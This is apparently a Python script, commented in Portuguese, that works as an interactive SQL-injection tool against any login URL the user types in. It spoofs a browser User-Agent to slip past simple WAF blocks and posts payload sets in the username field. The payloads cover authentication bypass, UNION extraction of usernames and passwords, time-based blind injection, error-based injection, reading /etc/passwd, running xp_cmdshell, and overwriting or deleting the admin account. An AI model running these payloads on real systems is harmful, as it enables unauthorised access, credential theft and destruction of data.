import requests

# Headers HTTP personalizados (para evitar bloqueios simples por WAF)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# Wordlist com possíveis indicações de login bem-sucedido
success_keywords = [
    "welcome", "dashboard", "painel de controle",
    "user profile", "logout", "bem-vindo", "sucesso",
    "área do usuário", "login bem-sucedido!"
]

# Tipos de ataque disponíveis
attacks = {
    "1": "Bypass Simples",
    "2": "Extração de Usuário/Admin",
    "3": "Injeção de Tempo (Blind SQL)",
    "4": "Injeção de Erro",
    "5": "Execução de Comandos",
    "6": "Modificação de Tabelas",
    "0": "Sair"
}

# Payloads associados a cada tipo de ataque
payloads_dict = {
    "1": ["' OR '1'='1 --", "' OR '1'='1 #", "' OR 1=1 --", "' OR 1=1 /*"],
    "2": ["' UNION SELECT 1, 'admin', 'password' --", "' UNION SELECT username, password FROM users --"],
    "3": ["' OR 1=1; SLEEP(5) --", "' AND IF(1=1, SLEEP(5), 0) --"],
    "4": ["' AND 1=CAST(version() AS INT) --", "' AND 1=CONVERT(int, @@version) --"],
    "5": ["' UNION SELECT NULL, LOAD_FILE('/etc/passwd') --", "'; EXEC xp_cmdshell('whoami') --"],
    "6": ["'; UPDATE users SET password='hacked' WHERE username='admin' --", "'; DELETE FROM users WHERE username='admin' --"]
}

while True:
    try:
        # URL alvo
        url = input("\nDigite aqui o site alvo (ex: http://site.com/login): ").strip()
        if not url.startswith("http"):
            print("[-] URL inválida. Deve começar com http:// ou https://")
            continue

        # Exibe opções para o usuário escolher
        print("\nEscolha o tipo de SQL Injection para testar:")
        for key, value in attacks.items():
            print(f"[{key}] {value}")

        choice = input("\nDigite o número do ataque desejado (ou 0 para sair): ").strip()

        if choice == "0":
            print("[*] Encerrando...")
            break

        payloads = payloads_dict.get(choice)
        if not payloads:
            print("[-] Opção inválida!")
            continue

        for payload in payloads:
            data = {"username": payload, "password": "password"}
            try:
                response = requests.post(url, data=data, headers=headers, timeout=10)
                response_text = response.text.lower()

                if any(word in response_text for word in success_keywords):
                    print(f"\n[+] Login possivelmente bypassado com payload: {payload}")
                    break
            except requests.exceptions.RequestException as e:
                print(f"[-] Erro ao conectar: {e}")
                break
        else:
            print("\n[-] Nenhum payload funcionou. O site pode estar protegido.")

    except KeyboardInterrupt:
        print("\n[*] Encerrado pelo usuário.")
        break
